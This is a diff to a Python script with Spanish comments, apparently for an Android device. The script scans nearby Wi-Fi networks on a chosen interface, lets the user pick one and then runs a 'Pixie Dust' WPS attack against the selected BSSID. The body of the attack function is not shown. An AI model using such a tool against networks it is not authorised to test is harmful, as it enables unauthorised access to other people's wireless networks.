@@ -47,10 +47,10 @@ def toggle_hotspot(state):
         print("Apagando Hotspot...")
         run_command("svc wifi tethering disable", use_sudo=True)
 
-def scan_wifi():
-    """Escanear redes Wi-Fi cercanas"""
-    print("Escaneando redes Wi-Fi...")
-    resultado, _ = run_command("iw dev wlan0 scan", use_sudo=True)
+def scan_wifi(interface):
+    """Escanear redes Wi-Fi cercanas utilizando la interfaz especificada"""
+    print(f"Escaneando redes Wi-Fi en la interfaz {interface}...")
+    resultado, _ = run_command(f"iw dev {interface} scan", use_sudo=True)
     redes = []
     bssids = []
     canales = []
@@ -103,8 +103,9 @@ def main():
     toggle_wifi("off")
     toggle_hotspot("on")
 
-    # Escanear redes Wi-Fi
-    redes, bssids, canales = scan_wifi()
+    # Escanear redes Wi-Fi utilizando la interfaz del hotspot (por ejemplo, wlan1)
+    hotspot_interface = "wlan1"  # Asegúrate de que esta sea la interfaz correcta para el hotspot en tu dispositivo
+    redes, bssids, canales = scan_wifi(hotspot_interface)
     if redes:
         print("Redes disponibles:")
         for i, red in enumerate(redes):
@@ -122,8 +123,8 @@ def main():
         print(f"BSSID: {bssid_seleccionado}")
         print(f"Canal: {canal_seleccionado}")
         
-        # Realizar el ataque Pixie Dust utilizando la interfaz de la zona hotspot
-        perform_pixie_dust_attack("wlan0", bssid_seleccionado)
+        # Realizar el ataque Pixie Dust utilizando la interfaz del hotspot
+        perform_pixie_dust_attack(hotspot_interface, bssid_seleccionado)
     else:
         print("No se encontraron redes WiFi.")
 
